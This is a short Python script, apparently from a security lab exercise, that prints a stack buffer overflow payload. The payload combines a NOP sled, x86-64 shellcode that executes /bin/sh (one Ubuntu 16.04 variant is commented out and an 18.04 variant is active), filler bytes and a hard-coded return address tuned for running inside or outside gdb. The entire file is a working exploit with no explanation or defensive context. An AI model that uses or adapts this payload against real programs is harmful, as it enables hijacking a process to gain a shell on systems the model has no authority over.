#!/usr/bin/python
#attack3.py

#n=100
n=136
nops_count=12
nopsled = '\x90' * nops_count

#shellcode that works on Ubuntu 16.04
#shellcode="\x55\x48\x89\xe5\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05\xb8\x00\x00\x00\x00\x5d\xc3"

# works on Ubuntu 18.04
# http://shell-storm.org/shellcode/files/shellcode-905.php
shellcode="\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

pad = 'A' * (n - nops_count - len(shellcode))

#when running inside gdb
rip = '\xd0\xdd\xff\xff\xff\x7f\x00\x00'

#when running outside gdb
#rip = '\x23\xe2\xff\xff\xff\x7f\x00\x00'

print nopsled + shellcode + pad + rip
